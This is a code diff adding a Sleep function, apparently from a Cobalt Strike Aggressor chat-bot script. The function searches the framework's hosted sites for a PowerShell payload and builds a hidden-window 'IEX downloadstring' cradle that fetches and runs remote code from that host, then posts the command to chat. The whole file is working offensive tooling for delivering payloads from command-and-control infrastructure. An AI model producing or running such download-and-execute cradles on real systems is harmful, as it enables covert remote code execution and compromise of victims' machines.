@@ -1,0 +1,20 @@
+sub getDownloadString {
+    foreach $s (sites()) {
+        println($s);
+        # Check if the site has powershell in the description
+        if ($s['Description'] hasmatch "powershell") {
+            # Build URL and DownloadString
+            $url = "https://" . $s['Host'] . $s['URI'];
+            $downloadString = "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('";
+            $downloadString .= $url . "'))\"";
+
+            println("Returning DownloadString: $downloadString");
+            say("Found Powershell DownloadString payload: \c9$downloadString\o");
+            return true;
+        }
+        else {
+            say("No DownloadString cradle found. Try !downloadstring <LISTENER> first.");
+        }
+    }
+    return false;
+}
